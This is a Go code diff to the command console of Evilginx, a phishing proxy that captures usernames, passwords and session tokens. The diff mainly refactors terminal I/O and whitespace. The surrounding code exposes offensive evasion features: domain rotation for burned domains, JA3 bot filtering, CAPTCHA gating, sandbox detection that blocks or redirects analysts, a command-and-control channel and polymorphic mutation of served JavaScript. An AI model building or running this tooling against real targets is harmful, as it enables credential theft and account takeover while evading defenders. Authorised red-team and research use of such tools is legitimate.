@@ -33,7 +33,7 @@ const (
 )
 
 type Terminal struct {
-	rl        *readline.Instance
+	io        TerminalIO
 	completer *readline.PrefixCompleter
 	cfg       *Config
 	crt_db    *CertDb
@@ -56,7 +56,7 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 	t.createHelp()
 	t.completer = t.hlp.GetPrefixCompleter(LAYER_TOP)
 
-	t.rl, err = readline.NewEx(&readline.Config{
+	rl, err := readline.NewEx(&readline.Config{
 		Prompt:              DEFAULT_PROMPT,
 		AutoComplete:        t.completer,
 		InterruptPrompt:     "^C",
@@ -66,23 +66,25 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 	if err != nil {
 		return nil, err
 	}
+
+	t.io = NewRealTerminalIO(rl)
 	return t, nil
 }
 
 func (t *Terminal) Close() {
-	t.rl.Close()
+	t.io.Close()
 }
 
 func (t *Terminal) output(s string, args ...interface{}) {
 	out := fmt.Sprintf(s, args...)
-	fmt.Fprintf(color.Output, "\n%s\n", out)
+	t.io.Printf("\n%s\n", out)
 }
 
 func (t *Terminal) DoWork() {
 	var do_quit = false
 
 	t.checkStatus()
-	log.SetReadline(t.rl)
+	log.SetReadline(t.io)
 
 	t.cfg.refreshActiveHostnames()
 	t.manageCertificates(true)
@@ -91,7 +93,7 @@ func (t *Terminal) DoWork() {
 	go t.monitorLurePause()
 
 	for !do_quit {
-		line, err := t.rl.Readline()
+		line, err := t.io.Readline()
 		if err == readline.ErrInterrupt {
 			log.Info("type 'exit' in order to quit")
 			continue
@@ -116,7 +118,7 @@ func (t *Terminal) DoWork() {
 		switch args[0] {
 		case "clear":
 			cmd_ok = true
-			readline.ClearScreen(color.Output)
+			readline.ClearScreen(t.io.GetOutput())
 		case "config":
 			cmd_ok = true
 			err := t.handleConfig(args[1:])
@@ -255,7 +257,7 @@ func (t *Terminal) handleConfig(args []string) error {
 		if t.cfg.IsCloudflareWorkerEnabled() {
 			cfWorkerEnabled = "true"
 		}
-		
+
 		lureStrategy := t.cfg.GetLureGenerationStrategy()
 
 		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "lure_strategy", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
@@ -587,7 +589,7 @@ func (t *Terminal) handleWhitelist(args []string) error {
 		}
 		log.Info("whitelist: %s", status)
 		log.Info("whitelist: loaded %d ip addresses and %d ip masks", ip_num, mask_num)
-		
+
 		if ip_num > 0 || mask_num > 0 {
 			log.Info("whitelisted IPs:")
 			for _, ip := range t.p.wl.GetAllIPs() {
@@ -659,7 +661,7 @@ func (t *Terminal) handleWhitelist(args []string) error {
 
 func (t *Terminal) handleJA3(args []string) error {
 	pn := len(args)
-	
+
 	// No arguments - show basic stats
 	if pn == 0 {
 		if t.p.ja3Fingerprinter != nil {
@@ -677,7 +679,7 @@ func (t *Terminal) handleJA3(args []string) error {
 		}
 		return nil
 	}
-	
+
 	// Handle subcommands
 	switch args[0] {
 	case "stats":
@@ -700,7 +702,7 @@ func (t *Terminal) handleJA3(args []string) error {
 			}
 		}
 		return nil
-		
+
 	case "signatures":
 		if t.p.ja3Fingerprinter != nil {
 			signatures := t.p.ja3Fingerprinter.ExportSignatures()
@@ -708,17 +710,17 @@ func (t *Terminal) handleJA3(args []string) error {
 			log.Info("")
 			log.Info("%-30s %-35s %-15s %s", "Bot Name", "JA3 Hash", "Confidence", "Description")
 			log.Info("%s %s %s %s", strings.Repeat("-", 30), strings.Repeat("-", 35), strings.Repeat("-", 15), strings.Repeat("-", 40))
-			
+
 			for _, sig := range signatures {
-				log.Info("%-30s %-35s %-15.0f%% %s", 
-					sig.Name, 
-					sig.JA3Hash, 
-					sig.Confidence * 100,
+				log.Info("%-30s %-35s %-15.0f%% %s",
+					sig.Name,
+					sig.JA3Hash,
+					sig.Confidence*100,
 					sig.Description)
 			}
 		}
 		return nil
-		
+
 	case "add":
 		if pn < 4 {
 			return fmt.Errorf("syntax: ja3 add <name> <ja3_hash> <description>")
@@ -726,38 +728,38 @@ func (t *Terminal) handleJA3(args []string) error {
 		name := args[1]
 		ja3Hash := args[2]
 		description := strings.Join(args[3:], " ")
-		
+
 		if len(ja3Hash) != 32 {
 			return fmt.Errorf("invalid JA3 hash length (must be 32 characters MD5 hash)")
 		}
-		
+
 		if t.p.ja3Fingerprinter != nil {
 			t.p.ja3Fingerprinter.AddCustomSignature(name, ja3Hash, description)
 			log.Success("Added custom JA3 signature for: %s", name)
 		}
 		return nil
-		
+
 	case "export":
 		if t.p.ja3Fingerprinter != nil {
 			signatures := t.p.ja3Fingerprinter.ExportSignatures()
-			
+
 			// Convert to JSON
 			output, err := json.MarshalIndent(signatures, "", "  ")
 			if err != nil {
 				return fmt.Errorf("failed to export signatures: %v", err)
 			}
-			
+
 			// Write to file
 			filename := fmt.Sprintf("ja3_signatures_%s.json", time.Now().Format("20060102_150405"))
 			err = ioutil.WriteFile(filename, output, 0644)
 			if err != nil {
 				return fmt.Errorf("failed to write file: %v", err)
 			}
-			
+
 			log.Success("Exported %d JA3 signatures to: %s", len(signatures), filename)
 		}
 		return nil
-		
+
 	default:
 		return fmt.Errorf("unknown subcommand: %s", args[0])
 	}
@@ -765,7 +767,7 @@ func (t *Terminal) handleJA3(args []string) error {
 
 func (t *Terminal) handleCaptcha(args []string) error {
 	pn := len(args)
-	
+
 	// No arguments - show current configuration
 	if pn == 0 {
 		if t.p.captchaManager != nil {
@@ -783,7 +785,7 @@ func (t *Terminal) handleCaptcha(args []string) error {
 		}
 		return nil
 	}
-	
+
 	// Handle subcommands
 	switch args[0] {
 	case "enable":
@@ -801,7 +803,7 @@ func (t *Terminal) handleCaptcha(args []string) error {
 			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
 		}
 		return nil
-		
+
 	case "provider":
 		if pn < 2 {
 			return fmt.Errorf("syntax: captcha provider <name>")
@@ -816,7 +818,7 @@ func (t *Terminal) handleCaptcha(args []string) error {
 			log.Success("Active CAPTCHA provider set to: %s", providerName)
 		}
 		return nil
-		
+
 	case "configure":
 		if pn < 4 {
 			return fmt.Errorf("syntax: captcha configure <provider> <site_key> <secret_key> [options]")
@@ -824,7 +826,7 @@ func (t *Terminal) handleCaptcha(args []string) error {
 		provider := args[1]
 		siteKey := args[2]
 		secretKey := args[3]
-		
+
 		// Parse options (key=value pairs)
 		options := make(map[string]string)
 		for i := 4; i < pn; i++ {
@@ -833,19 +835,19 @@ func (t *Terminal) handleCaptcha(args []string) error {
 				options[parts[0]] = parts[1]
 			}
 		}
-		
+
 		// Configure the provider
 		t.cfg.SetCaptchaProviderConfig(provider, siteKey, secretKey, options)
-		
+
 		// Reinitialize CAPTCHA manager with new config
 		if t.p.captchaManager != nil {
 			t.p.captchaManager = NewCaptchaManager(t.cfg.GetCaptchaConfig())
 		}
-		
+
 		log.Success("CAPTCHA provider %s configured successfully", provider)
 		log.Info("Options: %v", options)
 		return nil
-		
+
 	case "require":
 		if pn < 2 {
 			return fmt.Errorf("syntax: captcha require <on|off>")
@@ -861,7 +863,7 @@ func (t *Terminal) handleCaptcha(args []string) error {
 			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
 		}
 		return nil
-		
+
 	case "test":
 		if t.p.captchaManager != nil && t.p.captchaManager.IsEnabled() {
 			provider := t.p.captchaManager.GetActiveProvider()
@@ -876,7 +878,7 @@ func (t *Terminal) handleCaptcha(args []string) error {
 			log.Error("CAPTCHA is not enabled")
 		}
 		return nil
-		
+
 	default:
 		return fmt.Errorf("unknown subcommand: %s", args[0])
 	}
@@ -884,7 +886,7 @@ func (t *Terminal) handleCaptcha(args []string) error {
 
 func (t *Terminal) handleDomainRotation(args []string) error {
 	pn := len(args)
-	
+
 	// No arguments - show current configuration
 	if pn == 0 {
 		if t.p.domainRotation != nil {
@@ -906,7 +908,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		}
 		return nil
 	}
-	
+
 	// Handle subcommands
 	switch args[0] {
 	case "enable":
@@ -932,7 +934,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
 		}
 		return nil
-		
+
 	case "strategy":
 		if pn < 2 {
 			return fmt.Errorf("syntax: domain-rotation strategy <type>")
@@ -944,7 +946,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		t.cfg.SetDomainRotationStrategy(strategy)
 		log.Success("Domain rotation strategy set to: %s", strategy)
 		return nil
-		
+
 	case "interval":
 		if pn < 2 {
 			return fmt.Errorf("syntax: domain-rotation interval <minutes>")
@@ -956,7 +958,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		t.cfg.SetDomainRotationInterval(interval)
 		log.Success("Domain rotation interval set to: %d minutes", interval)
 		return nil
-		
+
 	case "max-domains":
 		if pn < 2 {
 			return fmt.Errorf("syntax: domain-rotation max-domains <count>")
@@ -968,7 +970,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		t.cfg.SetDomainRotationMaxDomains(count)
 		log.Success("Maximum domains set to: %d", count)
 		return nil
-		
+
 	case "auto-generate":
 		if pn < 2 {
 			return fmt.Errorf("syntax: domain-rotation auto-generate <on|off>")
@@ -984,7 +986,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
 		}
 		return nil
-		
+
 	case "add-domain":
 		if pn < 4 {
 			return fmt.Errorf("syntax: domain-rotation add-domain <domain> <subdomain> <provider>")
@@ -992,51 +994,51 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		domain := args[1]
 		subdomain := args[2]
 		provider := args[3]
-		
+
 		if t.p.domainRotation == nil {
 			return fmt.Errorf("domain rotation not initialized, enable it first")
 		}
-		
+
 		err := t.p.domainRotation.AddDomain(domain, subdomain, provider)
 		if err != nil {
 			return err
 		}
 		log.Success("Domain %s.%s added to rotation pool", subdomain, domain)
 		return nil
-		
+
 	case "remove-domain":
 		if pn < 2 {
 			return fmt.Errorf("syntax: domain-rotation remove-domain <full_domain>")
 		}
 		fullDomain := args[1]
-		
+
 		if t.p.domainRotation == nil {
 			return fmt.Errorf("domain rotation not initialized")
 		}
-		
+
 		err := t.p.domainRotation.RemoveDomain(fullDomain)
 		if err != nil {
 			return err
 		}
 		log.Success("Domain %s removed from rotation pool", fullDomain)
 		return nil
-		
+
 	case "list":
 		if t.p.domainRotation == nil {
 			return fmt.Errorf("domain rotation not initialized")
 		}
-		
+
 		domains := t.p.domainRotation.GetDomains()
 		if len(domains) == 0 {
 			log.Info("No domains in rotation pool")
 			return nil
 		}
-		
+
 		log.Info("=== Domains in Rotation Pool ===")
 		log.Info("")
 		log.Info("%-30s %-10s %-7s %-15s %-10s %s", "Domain", "Status", "Health", "Provider", "Requests", "Created")
 		log.Info("%s %s %s %s %s %s", strings.Repeat("-", 30), strings.Repeat("-", 10), strings.Repeat("-", 7), strings.Repeat("-", 15), strings.Repeat("-", 10), strings.Repeat("-", 20))
-		
+
 		for _, rd := range domains {
 			log.Info("%-30s %-10s %-7d %-15s %-10d %s",
 				rd.FullDomain,
@@ -1047,7 +1049,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 				rd.CreatedAt.Format("2006-01-02 15:04:05"))
 		}
 		return nil
-		
+
 	case "add-provider":
 		if pn < 6 {
 			return fmt.Errorf("syntax: domain-rotation add-provider <name> <type> <api_key> <api_secret> <zone> [options]")
@@ -1057,7 +1059,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		apiKey := args[3]
 		apiSecret := args[4]
 		zone := args[5]
-		
+
 		// Parse options
 		options := make(map[string]string)
 		for i := 6; i < pn; i++ {
@@ -1066,34 +1068,34 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 				options[parts[0]] = parts[1]
 			}
 		}
-		
+
 		t.cfg.AddDomainRotationDNSProvider(name, providerType, apiKey, apiSecret, zone, options)
 		log.Success("DNS provider %s added", name)
 		return nil
-		
+
 	case "mark-compromised":
 		if pn < 3 {
 			return fmt.Errorf("syntax: domain-rotation mark-compromised <full_domain> <reason>")
 		}
 		fullDomain := args[1]
 		reason := strings.Join(args[2:], " ")
-		
+
 		if t.p.domainRotation == nil {
 			return fmt.Errorf("domain rotation not initialized")
 		}
-		
+
 		err := t.p.domainRotation.MarkCompromised(fullDomain, reason)
 		if err != nil {
 			return err
 		}
 		log.Success("Domain %s marked as compromised", fullDomain)
 		return nil
-		
+
 	case "stats":
 		if t.p.domainRotation == nil {
 			return fmt.Errorf("domain rotation not initialized")
 		}
-		
+
 		stats := t.p.domainRotation.GetStats()
 		log.Info("=== Domain Rotation Statistics ===")
 		log.Info("")
@@ -1116,7 +1118,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 			}
 		}
 		return nil
-		
+
 	default:
 		return fmt.Errorf("unknown subcommand: %s", args[0])
 	}
@@ -1124,7 +1126,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 
 func (t *Terminal) handleTrafficShaping(args []string) error {
 	pn := len(args)
-	
+
 	// No arguments - show current configuration
 	if pn == 0 {
 		if t.p.trafficShaper != nil {
@@ -1145,7 +1147,7 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 		}
 		return nil
 	}
-	
+
 	// Handle subcommands
 	switch args[0] {
 	case "enable":
@@ -1171,7 +1173,7 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
 		}
 		return nil
-		
+
 	case "mode":
 		if pn < 2 {
 			return fmt.Errorf("syntax: traffic-shaping mode <adaptive|strict|learning>")
@@ -1183,7 +1185,7 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 		t.cfg.SetTrafficShapingMode(mode)
 		log.Success("Traffic shaping mode set to: %s", mode)
 		return nil
-		
+
 	case "global-limit":
 		if pn < 3 {
 			return fmt.Errorf("syntax: traffic-shaping global-limit <rate> <burst>")
@@ -1199,7 +1201,7 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 		t.cfg.SetTrafficShapingGlobalLimit(rate, burst)
 		log.Success("Global rate limit set to: %d/s (burst: %d)", rate, burst)
 		return nil
-		
+
 	case "ip-limit":
 		if pn < 3 {
 			return fmt.Errorf("syntax: traffic-shaping ip-limit <rate> <burst>")
@@ -1215,7 +1217,7 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 		t.cfg.SetTrafficShapingPerIPLimit(rate, burst)
 		log.Success("Per-IP rate limit set to: %d/s (burst: %d)", rate, burst)
 		return nil
-		
+
 	case "bandwidth-limit":
 		if pn < 2 {
 			return fmt.Errorf("syntax: traffic-shaping bandwidth-limit <bytes/sec>")
@@ -1227,7 +1229,7 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 		t.cfg.SetTrafficShapingBandwidthLimit(limit)
 		log.Success("Bandwidth limit set to: %d bytes/s", limit)
 		return nil
-		
+
 	case "geo-rule":
 		if pn < 6 {
 			return fmt.Errorf("syntax: traffic-shaping geo-rule <country> <rate> <burst> <priority> <block>")
@@ -1249,16 +1251,16 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 		if args[5] == "true" || args[5] == "yes" || args[5] == "block" {
 			blocked = true
 		}
-		
+
 		t.cfg.SetTrafficShapingGeoRule(country, rate, burst, priority, blocked)
 		log.Success("Geographic rule for %s configured", country)
 		return nil
-		
+
 	case "stats":
 		if t.p.trafficShaper == nil {
 			return fmt.Errorf("traffic shaping not initialized")
 		}
-		
+
 		stats := t.p.trafficShaper.GetStats()
 		log.Info("=== Traffic Shaping Statistics ===")
 		log.Info("")
@@ -1278,7 +1280,7 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 		log.Info("  IP Limiters: %d", stats["active_limiters"])
 		log.Info("  Queue Size: %d", stats["queue_size"])
 		log.Info("  Anomaly Events: %d", stats["anomaly_events"])
-		
+
 		// Show geographic blocks if any
 		if geoBlocks, ok := stats["geographic_blocks"].(map[string]int64); ok && len(geoBlocks) > 0 {
 			log.Info("")
@@ -1288,7 +1290,7 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 			}
 		}
 		return nil
-		
+
 	default:
 		return fmt.Errorf("unknown subcommand: %s", args[0])
 	}
@@ -1296,7 +1298,7 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 
 func (t *Terminal) handleSandbox(args []string) error {
 	pn := len(args)
-	
+
 	// No arguments - show current configuration
 	if pn == 0 {
 		config := t.cfg.GetSandboxDetectionConfig()
@@ -1308,7 +1310,7 @@ func (t *Terminal) handleSandbox(args []string) error {
 			log.Info("  Action on Detection: %s", config.ActionOnDetection)
 			log.Info("  Server-side Checks: %v", config.ServerSideChecks)
 			log.Info("  Client-side Checks: %v", config.ClientSideChecks)
-			
+
 			if t.p.sandboxDetector != nil {
 				stats := t.p.sandboxDetector.GetStats()
 				log.Info("")
@@ -1321,13 +1323,13 @@ func (t *Terminal) handleSandbox(args []string) error {
 		} else {
 			log.Info("Sandbox detection not configured")
 		}
-		
+
 		log.Info("")
 		log.Info("Use 'sandbox enable on' to enable sandbox detection")
 		log.Info("Use 'sandbox stats' for detailed statistics")
 		return nil
 	}
-	
+
 	// Handle subcommands
 	switch args[0] {
 	case "enable":
@@ -1349,7 +1351,7 @@ func (t *Terminal) handleSandbox(args []string) error {
 			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
 		}
 		return nil
-		
+
 	case "mode":
 		if pn < 2 {
 			return fmt.Errorf("syntax: sandbox mode <passive|active|aggressive>")
@@ -1361,7 +1363,7 @@ func (t *Terminal) handleSandbox(args []string) error {
 		t.cfg.SetSandboxDetectionMode(mode)
 		log.Success("Sandbox detection mode set to: %s", mode)
 		return nil
-		
+
 	case "threshold":
 		if pn < 2 {
 			return fmt.Errorf("syntax: sandbox threshold <0.0-1.0>")
@@ -1373,7 +1375,7 @@ func (t *Terminal) handleSandbox(args []string) error {
 		t.cfg.SetSandboxDetectionThreshold(threshold)
 		log.Success("Sandbox detection threshold set to: %.2f", threshold)
 		return nil
-		
+
 	case "action":
 		if pn < 2 {
 			return fmt.Errorf("syntax: sandbox action <block|redirect|honeypot>")
@@ -1385,7 +1387,7 @@ func (t *Terminal) handleSandbox(args []string) error {
 		t.cfg.SetSandboxDetectionAction(action)
 		log.Success("Sandbox detection action set to: %s", action)
 		return nil
-		
+
 	case "redirect":
 		if pn < 2 {
 			return fmt.Errorf("syntax: sandbox redirect <url>")
@@ -1398,7 +1400,7 @@ func (t *Terminal) handleSandbox(args []string) error {
 		t.cfg.SetSandboxDetectionRedirect(redirectURL)
 		log.Success("Sandbox redirect URL set to: %s", redirectURL)
 		return nil
-		
+
 	case "honeypot":
 		if pn < 2 {
 			return fmt.Errorf("syntax: sandbox honeypot <html>")
@@ -1408,12 +1410,12 @@ func (t *Terminal) handleSandbox(args []string) error {
 		t.cfg.SetSandboxDetectionHoneypot(honeypotHTML)
 		log.Success("Sandbox honeypot response configured")
 		return nil
-		
+
 	case "stats":
 		if t.p.sandboxDetector == nil {
 			return fmt.Errorf("sandbox detection not initialized")
 		}
-		
+
 		stats := t.p.sandboxDetector.GetStats()
 		log.Info("=== Sandbox Detection Statistics ===")
 		log.Info("")
@@ -1431,7 +1433,7 @@ func (t *Terminal) handleSandbox(args []string) error {
 			}
 		}
 		return nil
-		
+
 	default:
 		return fmt.Errorf("unknown subcommand: %s", args[0])
 	}
@@ -1439,7 +1441,7 @@ func (t *Terminal) handleSandbox(args []string) error {
 
 func (t *Terminal) handleC2(args []string) error {
 	pn := len(args)
-	
+
 	// No arguments - show current configuration
 	if pn == 0 {
 		config := t.cfg.GetC2ChannelConfig()
@@ -1450,7 +1452,7 @@ func (t *Terminal) handleC2(args []string) error {
 			log.Info("  Servers: %d configured", len(config.Servers))
 			log.Info("  Heartbeat Interval: %d seconds", config.HeartbeatInterval)
 			log.Info("  Compression: %v", config.Compression)
-			
+
 			if t.p.c2Channel != nil {
 				status := t.p.c2Channel.GetStatus()
 				log.Info("")
@@ -1461,13 +1463,13 @@ func (t *Terminal) handleC2(args []string) error {
 		} else {
 			log.Info("C2 channel not configured")
 		}
-		
+
 		log.Info("")
 		log.Info("Use 'c2 enable on' to enable C2 channel")
 		log.Info("Use 'c2 status' for detailed statistics")
 		return nil
 	}
-	
+
 	// Handle subcommands
 	switch args[0] {
 	case "enable":
@@ -1500,7 +1502,7 @@ func (t *Terminal) handleC2(args []string) error {
 			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
 		}
 		return nil
-		
+
 	case "transport":
 		if pn < 2 {
 			return fmt.Errorf("syntax: c2 transport <https|dns>")
@@ -1512,7 +1514,7 @@ func (t *Terminal) handleC2(args []string) error {
 		t.cfg.SetC2ChannelTransport(transport)
 		log.Success("C2 transport set to: %s", transport)
 		return nil
-		
+
 	case "server":
 		if pn < 2 {
 			return fmt.Errorf("syntax: c2 server <add|remove|list>")
@@ -1533,7 +1535,7 @@ func (t *Terminal) handleC2(args []string) error {
 			}
 			log.Success("C2 server added: %s", id)
 			return nil
-			
+
 		case "remove":
 			if pn < 3 {
 				return fmt.Errorf("syntax: c2 server remove <id>")
@@ -1543,7 +1545,7 @@ func (t *Terminal) handleC2(args []string) error {
 			}
 			log.Success("C2 server removed: %s", args[2])
 			return nil
-			
+
 		case "list":
 			config := t.cfg.GetC2ChannelConfig()
 			if len(config.Servers) == 0 {
@@ -1559,11 +1561,11 @@ func (t *Terminal) handleC2(args []string) error {
 				}
 			}
 			return nil
-			
+
 		default:
 			return fmt.Errorf("unknown server command: %s", args[1])
 		}
-		
+
 	case "key":
 		if pn < 2 {
 			return fmt.Errorf("syntax: c2 key <generate|import|export>")
@@ -1580,7 +1582,7 @@ func (t *Terminal) handleC2(args []string) error {
 			log.Success("New encryption key generated")
 			log.Info("Public key: %s", encryptor.ExportPublicKey())
 			return nil
-			
+
 		case "import":
 			if pn < 3 {
 				return fmt.Errorf("syntax: c2 key import <base64_key>")
@@ -1588,7 +1590,7 @@ func (t *Terminal) handleC2(args []string) error {
 			t.cfg.SetC2ChannelKey(args[2])
 			log.Success("Encryption key imported")
 			return nil
-			
+
 		case "export":
 			config := t.cfg.GetC2ChannelConfig()
 			if config.EncryptionKey == "" {
@@ -1598,11 +1600,11 @@ func (t *Terminal) handleC2(args []string) error {
 				log.Info("%s", config.EncryptionKey)
 			}
 			return nil
-			
+
 		default:
 			return fmt.Errorf("unknown key command: %s", args[1])
 		}
-		
+
 	case "auth":
 		if pn < 2 {
 			return fmt.Errorf("syntax: c2 auth <token>")
@@ -1610,33 +1612,33 @@ func (t *Terminal) handleC2(args []string) error {
 		t.cfg.SetC2ChannelAuthToken(args[1])
 		log.Success("Authentication token set")
 		return nil
-		
+
 	case "test":
 		if t.p.c2Channel == nil {
 			return fmt.Errorf("C2 channel not initialized")
 		}
-		
+
 		log.Info("Testing C2 connection...")
-		
+
 		// Send test command
 		cmdId, err := t.p.c2Channel.SendCommand("test", map[string]interface{}{
-			"message": "Connection test from Evilginx",
+			"message":   "Connection test from Evilginx",
 			"timestamp": time.Now().Unix(),
 		})
-		
+
 		if err != nil {
 			log.Error("C2 test failed: %v", err)
 			return err
 		}
-		
+
 		log.Success("C2 test command sent (ID: %s)", cmdId)
 		return nil
-		
+
 	case "status":
 		if t.p.c2Channel == nil {
 			return fmt.Errorf("C2 channel not initialized")
 		}
-		
+
 		stats := t.p.c2Channel.GetStats()
 		log.Info("=== C2 Channel Statistics ===")
 		log.Info("")
@@ -1660,7 +1662,7 @@ func (t *Terminal) handleC2(args []string) error {
 			log.Info("Last Error: %s", lastError)
 		}
 		return nil
-		
+
 	default:
 		return fmt.Errorf("unknown subcommand: %s", args[0])
 	}
@@ -1668,7 +1670,7 @@ func (t *Terminal) handleC2(args []string) error {
 
 func (t *Terminal) handlePolymorphic(args []string) error {
 	pn := len(args)
-	
+
 	// No arguments - show current configuration
 	if pn == 0 {
 		config := t.cfg.GetPolymorphicConfig()
@@ -1681,7 +1683,7 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 			log.Info("  Seed Rotation: %d minutes", config.SeedRotation)
 			log.Info("  Template Mode: %v", config.TemplateMode)
 			log.Info("  Preserve Semantics: %v", config.PreserveSemantics)
-			
+
 			if t.p.polymorphicEngine != nil {
 				stats := t.p.polymorphicEngine.GetStats()
 				log.Info("")
@@ -1694,13 +1696,13 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 		} else {
 			log.Info("Polymorphic engine not configured")
 		}
-		
+
 		log.Info("")
 		log.Info("Use 'polymorphic enable on' to enable polymorphic mutations")
 		log.Info("Use 'polymorphic stats' for detailed statistics")
 		return nil
 	}
-	
+
 	// Handle subcommands
 	switch args[0] {
 	case "enable":
@@ -1722,7 +1724,7 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
 		}
 		return nil
-		
+
 	case "level":
 		if pn < 2 {
 			return fmt.Errorf("syntax: polymorphic level <low|medium|high|extreme>")
@@ -1734,7 +1736,7 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 		t.cfg.SetPolymorphicLevel(level)
 		log.Success("Polymorphic mutation level set to: %s", level)
 		return nil
-		
+
 	case "cache":
 		if pn < 2 {
 			return fmt.Errorf("syntax: polymorphic cache <on|off|clear>")
@@ -1757,7 +1759,7 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 			return fmt.Errorf("invalid option: %s (use: on, off, clear)", args[1])
 		}
 		return nil
-		
+
 	case "seed-rotation":
 		if pn < 2 {
 			return fmt.Errorf("syntax: polymorphic seed-rotation <minutes>")
@@ -1769,7 +1771,7 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 		t.cfg.SetPolymorphicSeedRotation(minutes)
 		log.Success("Polymorphic seed rotation set to: %d minutes", minutes)
 		return nil
-		
+
 	case "template-mode":
 		if pn < 2 {
 			return fmt.Errorf("syntax: polymorphic template-mode <on|off>")
@@ -1785,14 +1787,14 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
 		}
 		return nil
-		
+
 	case "mutation":
 		if pn < 3 {
 			return fmt.Errorf("syntax: polymorphic mutation <type> <on|off>")
 		}
 		mutationType := args[1]
 		validTypes := []string{"variables", "functions", "deadcode", "controlflow", "strings", "math", "comments", "whitespace"}
-		
+
 		valid := false
 		for _, vt := range validTypes {
 			if mutationType == vt {
@@ -1800,11 +1802,11 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 				break
 			}
 		}
-		
+
 		if !valid {
 			return fmt.Errorf("invalid mutation type: %s (use: %s)", mutationType, strings.Join(validTypes, ", "))
 		}
-		
+
 		enabled := false
 		switch args[2] {
 		case "on":
@@ -1814,34 +1816,34 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 		default:
 			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[2])
 		}
-		
+
 		t.cfg.SetPolymorphicMutation(mutationType, enabled)
 		log.Success("Polymorphic mutation '%s' %s", mutationType, map[bool]string{true: "enabled", false: "disabled"}[enabled])
 		return nil
-		
+
 	case "test":
 		if t.p.polymorphicEngine == nil {
 			return fmt.Errorf("polymorphic engine not initialized")
 		}
-		
+
 		// Default test code
 		testCode := `function getData() { var result = 42; return result; }`
-		
+
 		if pn > 1 {
 			// Use provided code
 			testCode = strings.Join(args[1:], " ")
 		}
-		
+
 		log.Info("Original code:")
 		log.Info("%s", testCode)
 		log.Info("")
-		
+
 		// Generate mutations
 		context := &MutationContext{
 			SessionID: "test-session",
 			Timestamp: time.Now().Unix(),
 		}
-		
+
 		for i := 1; i <= 3; i++ {
 			context.Seed = int64(i)
 			mutated := t.p.polymorphicEngine.Mutate(testCode, context)
@@ -1849,14 +1851,14 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 			log.Info("%s", mutated)
 			log.Info("")
 		}
-		
+
 		return nil
-		
+
 	case "stats":
 		if t.p.polymorphicEngine == nil {
 			return fmt.Errorf("polymorphic engine not initialized")
 		}
-		
+
 		stats := t.p.polymorphicEngine.GetStats()
 		log.Info("=== Polymorphic Engine Statistics ===")
 		log.Info("")
@@ -1868,7 +1870,7 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 		log.Info("Cache:")
 		log.Info("  Cache Hits: %d", stats["cache_hits"])
 		log.Info("  Cache Size: %d entries", stats["cache_size"])
-		
+
 		if t.cfg.GetPolymorphicConfig().CacheEnabled {
 			hitRate := float64(0)
 			totalRequests := stats["total_mutations"].(int64) + stats["cache_hits"].(int64)
@@ -1877,9 +1879,9 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 			}
 			log.Info("  Hit Rate: %.1f%%", hitRate)
 		}
-		
+
 		return nil
-		
+
 	default:
 		return fmt.Errorf("unknown subcommand: %s", args[0])
 	}
@@ -1983,7 +1985,7 @@ func (t *Terminal) handleSessions(args []string) error {
 			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
 				tcol = lgreen.Sprintf("captured")
 			}
-			row := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(truncateString(s.Username, 24)), lblue.Sprintf(truncateString(s.Password, 24)), tcol, yellow.Sprintf(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
